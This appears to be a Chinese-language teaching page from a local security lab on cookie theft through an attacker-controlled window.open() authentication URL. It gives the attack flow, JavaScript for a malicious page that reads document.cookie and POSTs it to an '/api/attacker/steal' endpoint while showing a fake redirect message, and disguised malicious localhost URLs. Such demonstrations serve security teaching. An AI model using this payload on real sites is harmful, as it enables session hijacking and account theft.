😈 Case1 攻击：window.open() Cookie 窃取

🎯 攻击原理

受害者在 case1-auth.html 页面中使用 window.open() 打开第三方认证页面时， 如果认证 URL 参数可以被攻击者控制，攻击者可以构造一个恶意 URL， 将用户重定向到自己的恶意页面，从而窃取受害者的 cookie。

攻击流程：

  1. 攻击者准备一个恶意页面（当前页面），该页面会读取 document.cookie
  2. 攻击者构造恶意 URL，指向自己的恶意页面
  3. 攻击者诱导受害者在 case1-auth.html 中输入或选择这个恶意 URL
  4. 受害者点击"打开认证窗口"时，window.open() 会打开攻击者的恶意页面
  5. 恶意页面自动读取 cookie 并发送到攻击者服务器
  6. 攻击者在后台查看窃取的 cookie

💻 攻击代码展示

// 恶意页面（attacker-case1.html）的代码 // 当受害者通过 window.open() 打开此页面时，自动执行以下代码
// 1. 读取当前页面的所有 cookie const cookies = document.cookie;
// 2. 提取 case1Token（如果存在） const case1Token = cookies .split('; ') .find(c => c.startsWith('case1Token=')) ?.split('=')[1];
// 3. 将 cookie 发送到攻击者服务器 fetch('/api/attacker/steal', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ caseId: 'case1', attackType: 'window.open', cookies: cookies, case1Token: case1Token, referer: document.referrer, userAgent: navigator.userAgent }) });
// 4. 可选：显示虚假的认证页面，让受害者以为这是正常的认证流程 document.body.innerHTML = '<h1>正在跳转...</h1>';

🔗 恶意 URL 构造

攻击者需要构造以下 URL，让受害者在 case1-auth.html 中使用：

http://localhost:8080/attacker-case1.html
// 或者更隐蔽的方式，伪装成正常的认证 URL： http://localhost:8080/attacker-case1.html?provider=github&client_id=fake

在 case1-auth.html 中，如果用户选择"自定义"认证提供商并输入上述 URL， 点击"打开认证窗口"时，window.open() 会打开此恶意页面。
